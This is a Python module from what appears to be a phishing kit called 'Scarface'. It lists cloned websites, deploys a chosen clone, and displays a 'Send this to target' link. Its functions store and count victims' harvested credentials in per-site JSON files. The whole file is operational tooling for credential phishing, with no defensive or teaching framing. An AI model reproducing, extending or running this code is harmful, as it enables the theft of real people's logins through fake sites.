import os
import json
import mimetypes
from urllib.parse import unquote

CYAN = "\033[36m"
BLUE = "\033[34m"
RED = "\033[91m"
GREEN = "\033[92m"
LIGHT_GREEN = "\033[38;5;120m"
BOLD = "\033[1m"
RESET = "\033[0m"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SCARFACE_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, '..'))
CREDENTIALS_DIR = os.path.join(SCARFACE_ROOT, "credentials")
SITES_DIRS = [
    os.path.join(SCRIPT_DIR, 'sites'),
    os.path.join(SCARFACE_ROOT, 'sites'),
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def read_banner():
    banner_path = os.path.join(SCRIPT_DIR, ".banner.txt")
    if not os.path.exists(banner_path):
        return "=== Scarface ==="
    with open(banner_path, "r", encoding="utf-8") as f:
        return f.read()

def print_banner_and_url(url):
    clear_screen()
    banner = read_banner()
    print(f"{GREEN}{banner}{RESET}\n")
    print(f"{BOLD}{CYAN}Send this to target:{RESET} {LIGHT_GREEN}{url}{RESET}\n")

def save_credentials(site, log_data):
    site_dir = os.path.join(CREDENTIALS_DIR, site)
    os.makedirs(site_dir, exist_ok=True)
    credentials_file = os.path.join(site_dir, "result.json")
    try:
        with open(credentials_file, "r") as f:
            data = json.load(f)
            if not isinstance(data, list):
                data = []
    except Exception:
        data = []
    data.append(log_data)
    with open(credentials_file, "w") as f:
        json.dump(data, f, indent=4)

def list_cloned_sites():
    found_sites = set()
    for sites_dir in SITES_DIRS:
        if not os.path.exists(sites_dir):
            os.makedirs(sites_dir, exist_ok=True)
        for d in os.listdir(sites_dir):
            full_dir = os.path.join(sites_dir, d)
            if os.path.isdir(full_dir):
                found_sites.add(d)
    return sorted(list(found_sites))

def get_site_dir(site_name):
    for sites_dir in SITES_DIRS[::-1]:
        site_path = os.path.join(sites_dir, site_name)
        if os.path.isdir(site_path):
            return site_path
    return os.path.join(SITES_DIRS[0], site_name)

def select_site(sites):
    print(f"\n{BOLD}{CYAN}Available Cloned Sites:{RESET}")
    for idx, site in enumerate(sites, 1):
        print(f"  {CYAN}{idx}.{RESET} {site}")
    while True:
        try:
            choice = int(input(f"\n{BLUE}Enter site number to deploy:{RESET} "))
            if 1 <= choice <= len(sites):
                return sites[choice - 1]
            print(f"{RED}[ERROR] Invalid number{RESET}")
        except ValueError:
            print(f"{RED}[ERROR] Enter a number{RESET}")

def find_main_file(site_dir):
    html_candidates = []
    php_candidates = []
    for root, dirs, files in os.walk(site_dir):
        for f in files:
            try:
                if f.endswith('.bak') or f.startswith('.'):
                    continue
                path = os.path.join(root, f)
                if f.lower() == "index.php":
                    return path, "php"
                elif f.lower().endswith(".php"):
                    php_candidates.append(path)
                elif f.lower() == "index.html":
                    html_candidates.insert(0, path)
                elif f.lower().endswith(".html"):
                    html_candidates.append(path)
            except (UnicodeDecodeError, OSError):
                continue
    if php_candidates:
        return php_candidates[0], "php"
    if html_candidates:
        return html_candidates[0], "html"
    return None, None

def get_php_credential_count(site_name):
    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
    credentials_file = os.path.join(site_dir, "result.json")
    if not os.path.exists(credentials_file):
        return 0
    try:
        with open(credentials_file, "r") as f:
            data = json.load(f)
            if isinstance(data, list):
                return len(data)
    except Exception:
        pass
    return 0
